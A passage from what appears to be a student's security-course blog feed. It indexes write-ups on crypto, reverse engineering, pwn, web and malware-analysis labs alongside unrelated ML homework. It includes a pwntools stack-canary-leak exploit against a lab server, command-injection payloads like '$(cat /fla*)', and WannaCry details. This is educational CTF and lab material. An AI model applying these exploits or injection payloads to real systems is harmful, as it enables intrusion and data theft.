+0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ct/ntu-compiler-technology-project-4/index.html</guid><description>NTU Compiler Technology Project 4 tags: NTU_CT NTU Compiler Techonology of Programming Language Code Generation [TOC]
How to run? First, put your testing file and main.S to the folder same as parser file
$ make $ ./parser [testing file].c $ aarch64-linux-gnu-gcc -static -O0 main.S $ qemu-aarch64-static ./a.out Or, you can put the run.sh and main.S in the same directory and run
$ ./run.sh [your parser] [the C file] $ qemu-aarch64-static ./a.out Note that you must change your test file’s main() to MAIN()</description></item><item><title>NTU CS 2023 HW1 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/index.html</guid><description>NTU CS 2023 HW1 Write Up Name: 何秉學 Student ID: R11921A16 :::spoiler TOC [TOC] :::
Lab-COR Flag: FLAG{Corre1ati0n_Attack!_!}
解題流程與思路 這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:
What we have: 我們有的東西就是密文，所以可以利用它動一些手腳 Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少 Our Goal 2: 這樣才可以取得最後的明文69 How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69 所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0…15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳Well received :)代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte
Lab-LSB Flag: FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}
解題流程與思路 這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了</description></item><item><title>NTU CS 2023 HW2 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html</guid><description>NTU CS 2023 HW2 Write Up Name: 何秉學 Student ID: R11921A16 :::spoiler TOC [TOC] :::
Lab-HelloRevWorld Flag: FLAG{h311O_revers1ng_3ngineer5}
解題流程與思路 這一題主要是練習如何把如何把bytes變成字串:
可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\downarrow$</description></item><item><title>NTU CS 2023 HW3 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html</guid><description>NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
解題流程與思路 這一題就是前一年的Leak Canary的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:
接收開shell的function的address(win function) 接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP 傳送payload過去，分別是p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) 這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell :::info 比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中&lt;do_system+115> movaps XMMWORD PTR [rsp], xmm1，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV 解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題 :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}</description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html</guid><description>NTU CS 2023 HW4 Write Up Lab-Cat Shop Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}
解題流程與思路 這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選 但因為送出的item number可預期，所以還是能夠正常query 接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag Lab-DNS Lookuper Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}
解題流程與思路 Use $ or ` string to bypass blacklist Payload: '$(cat /fla*)' 'cat /fl*g*'</description></item><item><title>NTU CS HW0 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/index.html</guid><description>NTU CS HW0 Write Up :::spoiler TOC [TOC] :::
Easy C2 Flag: FLAG{C2_cmd_in_http_header} Description 我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{…}。 此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。
Google 關鍵字：IDA freeware、Ghidra、malware C2
解題思路 Simple 解題思路 $ file easy-c2 easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped IDA int __cdecl main(int argc, const char **argv, const char **envp) { int sockfd; // [rsp+1Ch] [rbp-24h] char *flag; // [rsp+20h] [rbp-20h] BYREF char *enc_flag; // [rsp+28h] [rbp-18h] char *host; // [rsp+30h] [rbp-10h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); enc_flag = byte_20F0; host = "127.0.0.1"; sockfd = socket_connect("127.0.0.1", 11187); decode_flag(&amp;flag, byte_20F0); send_msg(sockfd, flag); puts("Message sent."); sleep(1u); free(flag); close(sockfd); return 0; } 可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息 Exploit $ nc -lvp 11187 Listening on 0.0.0.0 11187 Connection received on localhost 54028 GET / HTTP/1.0 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36 Baby Crackme Flag: FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry} Description 透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis</description></item><item><title>NTU Machine Learning Final Project Proposal Notes</title><link>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/index.html</guid><description>NTU Machine Learning Final Project Proposal Notes tags: NTU_ML Machine Learning Paper Used Technique / Ingenuity Suitable / Unsuitable Reason Replace to [1] Models overview3D maps of gray and/or white matter (deep learning models: six layer CNN, ResNet, and Inception V1)vertex wise measurements from the surface-based processing (models BLUP and SVM)Model 1: Best Linear Unbiased Predictor(BLUP)Model 2: Support Vector RegressionModel 3: Six-Layer Convolutional Neural NetworksModel 4: Specialized Six-Layer Convolutional Neural Networks for Younger and Older SubjectsModel 5: ResNetModel 6: Inception V1 Additional ExperimentsDifferent Types of Model Combination: Linear Regression vs. Random ForestCombining Seven (Identical) Convolutional Neural Networks or the Seven Best EpochsInfluence of the Type of Brain Features on Prediction Accuracy Suitable:In this field, it’s very clearly on comparing 6 variety models which can help us to know the implementation what we learned in class.Also can aware of the result between high level model and custom level modelFor linear regression and random forest, they trained the ensemble algorithms on a random subset. They repeated this process 500 times to get a bootstrap estimate of the SE of the MAE. N/A [2] 2D and 3D-CNN on age estimationFor 2D-CNN, we consider the features as an image of size 168×60 (DH×M) ignoring the days as temporal information.However, for 3D-CNN, we consider the features as a 3D volume with temporal information across the days, where each day has 24 hours and an hour is 60 minutes. So to break it down, we represent the features as a three dimensional information of 7×24×60 (D×H×M) minutes. Unsuitable: Though the topic is interesting, the technique content is less then expectation and the . No Idea Yet [3] Model for classification:Random Forest, GLMNet, SVM(including e1071, which is a package of LibSVM in R language, LiblinearR, kernlab, Rgtsvm), and xgboostCalibration Algorithm(i.e. post-processing):logistic regression(GLM function), BRGLM, GLMNetPerformance evaluation: HandTill2001 Suitable:The reason is as the same as [1] which also used various methods and compare it to other papers detailed. N/A Appendix The custom model in [1]</description></item><item><title>NTU Machine Learning Final Project Proposal Notes</title><link>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/index.html</guid><description>NTU Machine Learning Final Project Proposal Notes tags: NTU_ML Machine Learning Deep6mAPred: A CNN and Bi-LSTM-based deep learning method for predicting DNA N6-methyladenosine sites across plant species Introduction &amp; Motivation DNA methylation alters activities of DNA segments without changing the sequence, which thus yields a wide variety of roles in the cellular processes across organisms or tissues DNA methylation is widely distributed both in prokaryote and in eukaryote, but the proportion of methylated residues differs greatly with species DNA methylation is essential for normal development DNA methylation is increasingly attracting attentions from biologists Related works Even Luo et al.[41] - proposed the DNA 6mA as a new epigenetic mark in eukaryotes</description></item><item><title>NTU Machine Learning Homework 1</title><link>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-homework-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-homework-1/index.html</guid><description>NTU Machine Learning Homework 1 tags: NTU_ML Machine Learning How to choose features of data After observing the training data visualized image, you can be aware of the relationship between the PM2.5 feature and the others. For instance, the CO image, NO image, NO2 image, and NOx image are much more correlated with PM2.5. I also choose PM10, WS_HR, RAINFALL, RH, WIND_SPEED, and PM2.5 which you can see here I used Zscore normalization to implement in my project and can see as below You can see the different result of using or unusing normalization with the same config. Epoch Regression LR Feats Batch Size Loss Fn. Opti. RMSE Data Filter Norm. Data 200 1st-order 0.015 [1-4, 6-9, 13, 14] 1024 MSE Adam 2.44623 Yes Yes 200 1st-order 0.015 [1-4, 6-9, 13, 14] 1024 MSE Adam 2.44623 Yes No Hyperparameter and Preprocessing All my testing config can be found in Training Result.xlsx I used a filter to choose valid data and set a threshold by observing the visualized figure of all features. My takeaway **(Solved->See the last paragraph)**Using normalization is not like what I thought. Practically speaking, using normalization can gather all data to a specific area that the model can converge much more rapidly. But, in this case, the result is worse and also appear negative value of the PM2.5 result. According to this page, maybe the normalization method is not suitable in my case. **(Solved->See the last paragraph)**I also figured that using the stored weight and bias by my pretrained model is not the right way. I used pickle to store the dump parameters during the training and used the best one as my pretrained parameter. But it’s still not that good enough. The better way in this project to enhance your accuracy is tuning your training config and select good features. After discussing with my friend, I figured out the problem and tried to solve it successfully by fitting numpy random seed. Then, the parameter will truly fix but normalization is still not working to help model converging. Update 2022/12/06 update - Refer to 相關 taught by Dr.李柏堅, I use Pearson Correlation to compute the correlation of each factor and PM2.5 and the result is shown as below. According to the video, |r| &lt; 0.4 is low correlation, 0.4 ≦ |r| &lt; 0.7is medium correlation, and 0.7 ≦ |r| &lt; 1 is high correlation. So, the factor CO, NO, NO2, NOx, PM10, and SO2 are quite suitable as our input data to address this regression problem. Factor AMB_TEMP CO NO NO2 NOx O3 PM10 WS_HR RAINFALL RH SO2 WD_HR WIND_DIREC WIND_SPEED r -0.176147465 0.659147668 0.227219147 0.554273687 0.51365014 0.233923944 0.818868214 -0.102047405 -0.060801221 -0.081576429 0.361333416 0.171932397 0.137658351 -0.10119696</description></item><item><title>NTU Machine Learning Homework 2</title><link>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-homework-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-ml/ntu-machine-learning-homework-2/index.html</guid><description>NTU Machine Learning Homework 2 tags: NTU_ML Machine Learning :::spoiler Click to open TOC [TOC] :::
Objective We’d like to classify human-being emotion by using CNN model that self-construct or others ready-made such as ResNet or VGG model.
Data We used emotional dataset from FER2013 that were preprocessed by lecture TA.
Models Originial
self.conv_0 = nn.Sequential( nn.Conv2d(1, 64, kernel_size=3, padding=1), nn.BatchNorm2d(64, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), ) I’ve used 3-level model for training but not have good result</description></item><item><title>NTU Malware Reverse Final Project Notes</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/index.html</guid><description>NTU Malware Reverse Final Project Notes tags: NTU_MR Malware Reverse Engineering and Analysis Deep learning at the shallow end Malware classification for non-domain experts How to reproduce? Construct Environment The whole construction step can see 安裝 tensorflow 及 cuda cudnn 心得. Refer to documentation for tensorflow, I choose the library shown as below…
Object CUDA cuDNN Python GPU Driver Version tensorflow tensorflow-gpu Version 11.2 8.1 3.6.13 526.98 2.6.2 2.6.0 Then refer to NVIDIA CUDNN DOCUMENTATION, just use zlibwapi.dll provided by this page directly. This compressed folder is for x64 processor. Notice that, DO NOT USE this page and this page. These are for x86 processor.</description></item><item><title>NTU Malware Reverse HW 1 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/index.html</guid><description>NTU Malware Reverse HW 1 write up tags: NTU_MR Malware Reverse Engineering and Analysis NTU [TOC]
Task 1 Analyze the Lab06-01.exe What is the major code construct found in the only subroutine called by main? Ans: It has only an if statement in the main function. What is the subroutine located at 0x40105F? Ans: It’s just a printf function. At the beginning, I can not recognize this code block do exactly until I analyze the program behavior by using string side bar to search the specific string in the code.</description></item><item><title>NTU Malware Reverse HW 2 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/index.html</guid><description>NTU Malware Reverse HW 2 write up tags: NTU_MR Malware Reverse Engineering and Analysis NTU [TOC]
Task 1 執行勒索病毒Dharma與Process monitor並截圖Dharma的Process Tree，並分析說明每個Process行為 Ans:
Conhost.exe: It’s defined by Microsoft and is normally legal and safe. Working on Win7, Win8, and Win10. The main function of this PE file is to let Command Prompt and Windows File Explorer can interact. The other function is to support users who can drag the file or folder to the command prompt directly. Most of the time, it’s a safe file that even repeats execution many times. However, in some circumstances, the viruses will pretend a conhost.exe file to use massive memory or store it in the wrong folder.[1]</description></item><item><title>NTU Malware Reverse HW 3 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/index.html</guid><description>NTU Malware Reverse HW 3 write up tags: NTU_MR Malware Reverse Engineering and Analysis [TOC]
Name 何秉學 StuID R11921A16 Task 1: Lab 15-01.exe Observation When I execute the file, it print out a message: Son, I am disappoint. Refer to the description below, I must enter some parameter that match the secret code.
Analyze the sample found in the file Lab15-01.exe. This is a command-line program that takes an argument and prints Good Job! if the argument matches a secret code.</description></item><item><title>NTU Malware Reverse Lab 1 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/index.html</guid><description>NTU Malware Reverse Lab 1 write up tags: NTU_MR Malware Reverse Engineering and Analysis NTU Name 何秉學 StuID R11921A16 WannaCry Change variable and data type Follow the video and replace most of the variable that ghidra did not recognize and retype them also. According to the video, you must search the entry point function(local_6c = FUN_00408140();) first and replace the signature by here Then click into WinMain function and you’ll see a strange url at the beginning of the top. Try to rename and retype it as char*. Ghidra can not recognize InternetOpenA, and InternetOpenUrlA. But you can found that ghidra cannot recognize hinternet datatype as well. So, we must create new datatype in Datt Type Manager. And in write_1831_to_tasksche.exe function, the first if-statement has 4 variable that ghidra can’t recognize, including createProcessA, _createFileA, _writeFile, _closeHandle. So, you’re not only rename them but retype them for the following statement for each of them.(Ghidra has all type of them but it just can not recognize.) When you have 1831.bin file(you can follow Analyze part at 5-th and 6-th section), useing Defined String window to check out some function including unzip_something function. Scroll down the Defined String, you’ll see string 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94 at 0x0040f488. Then in assembly code, there’re 3 similar function be called at the sametime. We called it bitcoin_something function. Analyze For the first part to analyze, you can check out for loop after strange_url variable. It does this loop for 14 times and copy strange_url to strange_url_copy by andding 4. Next, you can find an if statement at the below. Check this out carefully, it the internet request failed, it’ll access wannacry_real_entry() function. Enter to wannacry_real_entry function, you’ll see another if statement to examine your argument input. If you keyin less than 1 argument, it’ll execute no_argument_handler function and start create_wannacry_service function. Checking wannacry program in second function of no_argument_handler function by assembly language, you’ll find there’re two sprintf structure are not correct in the middle paragraph. Because, there’re two more argument should be pushed in stack but not be recognized by ghidra, including s_tasksche.exe_0043136c and 0x00407dea and s_WINDOWS_00431367 at 0x00407df2. So, we have to override this line signature and add the remaining argument back to sprinf. So, let’s take a look at this flow chart of what happened so far Then I used another VM(Ubuntu) to command wrestool to analyze wannacry file and output another file named 1831.bin. Using ghidra to analyze this file. Then do the same thing as above that what we do to analyze wannacry file such as change WinMain signature or renamee variable or retype variable, etc. While you’re analyzing in WinMain function, you’ll see a strange variable &amp;_Str2_0040f538 which store ‘/i’ characters. You can just press ‘c’ in assembly code to show ‘\i’. Next, scroll down this file, you’ll see a strange swprintf parameter called _Count_0040f40c. Then select all addr type data and right click mouse and select clear with option. You’ll see many unicode strings. Finally, right click DAT_0040f40c and choose Data/TerminatedUnicode. Finally, you can check this figure to know the whole operation flow 1.1 What is the ‘killswitch’ string? Ans: http://www.iuqerfsodp9ifjaposdfj 1.2 What is the unzip password? (as show in below) Ans: WNcry@2o17</description></item><item><title>NTU Malware Reverse Lab 2 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/index.html</guid><description>NTU Malware Reverse Lab 2 write up tags: NTU_MR Malware Reverse Engineering and Analysis NTU Name 何秉學 StuID R11921A16 Analyze the malware 1 found in the file Lab13-02.zip -> Lab13-02.exe, generate ‘yourself’ write ups (with screenshots) and answer the follow questions : 1.1 Using dynamic analysis, determine what this malware creates. Ans:
According to reference, you can also use procmon(Process Monitor) to monitor the whole progress after executing this file. The progress of first iteration is shown as below Then use PEiD to check if the file has shell or not. And refer to the result as below, it seems has not shell, so that we can use IDA directly. I used IDA to analyze this executable file and observe that it’ll execute sub_401851 function every 10 seconds. And when I execute it in VM, it’ll create a temp file name temp00XXXXXX. int __cdecl main(int argc, const char **argv, const char **envp) { while ( 1 ) { Sleep(5000u); sub_401851(); Sleep(5000u); } } 1.2 Use static techniques such as an xor search, FindCrypt2, KANAL, and the IDA Entropy Plugin to look for potential encoding. What do you find?(Install findcrypt and IDA Entropy plugin can refer to Appendix 1, 2) Ans:</description></item><item><title>NTU Malware Reverse Lab 3 write up</title><link>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/index.html</guid><description>NTU Malware Reverse Lab 3 write up tags: NTU_MR Malware Reverse Engineering and Analysis NTU [TOC]
Name 何秉學 StuID R11921A16 Review Packing and Unpacking How does packing and unpacking work? 作者會把原本的code section和data section，放在UPX1，並且用unpacking stub(裡面存放解殼的程式)，把UPX1的內容一點一點的還原回UPX0(也就是空區段)，並跳回正常程式的執行進入點(original entry point, OEP)，最後跳回去的動作叫做Tail Jump或Long Jump，另外，多長的jump才是長，可能要依照經驗值判斷，或是直接跳過去後分析程式在幹嘛 實際上執行脫殼的時候，除了OEP的重建外，還需要重建Imports，這兩者都處理好後才算是脫殼完成 當分析脫殼執行到如下圖這樣的情況時，就離終點不遠了，也就是jmp的地址離目前的程式很遠，且之後的程式有很多空指令或垃圾byte，此為UXP殼的特徵 可以用PEiD這個工具(或是用Entropy之類的，但是不一定準確)判斷樣本有沒有加殼，或是加了甚麼殼，上圖是沒有加殼的一般程式，下圖是加了UPX的加殼程式 若是要處理Import Table Reconstruction，可以用OllyDump、ImpRec或是Scylla這些工具來進行，在Practice中是用Scylla演示(且可以搭配x32dbg或x64dbg進行) 老師有說在Long Jump之前會搭配pop instruction，這可能可以當作解析OEP的線索 Tail Jump，不一定是用jmp，也可以是call instruction；另外，跳轉的地址也不一定是一個明確的地址，也可能用暫存器存起來，這部分可以注意一下 Practice - upx_exercise.exe Observation First things first, we can observe the file by executing it directly. Obviously, you should enter correct CTF key by analyzing. Unpacking Static analysis - IDA Pro You are not allowed to disassembly by doing nothing, because it was packed by UPX. Therefore, our objective is to unpack it and try to analyze it original code to get the CTF Flag. Dynamic analysis - x32dbg In UPX-based packing, it has a feature that in order to not let the data be flushed during unpacking, it must store all data to the stack by using pushad instruction. Then, you’ll see a lot of jmp instruction to unpack the original code. Scrolling down the code, you’ll see a popad instruction at 0x0134AEDE , a jmp instruction at 0x010EAEEC, and a lots of null instruction which all three are satisfied all features that UPX-based packing method has. It’ll restore all data that stored in stack and jump to upx_exercise.134244D. Set the break-point and press run button in x32dbg, then press step into button to observe the code. Now, the code has already unpacked, then we can use Scylla to do Import Reconstruction. Press IAT Autosearch(Import Address 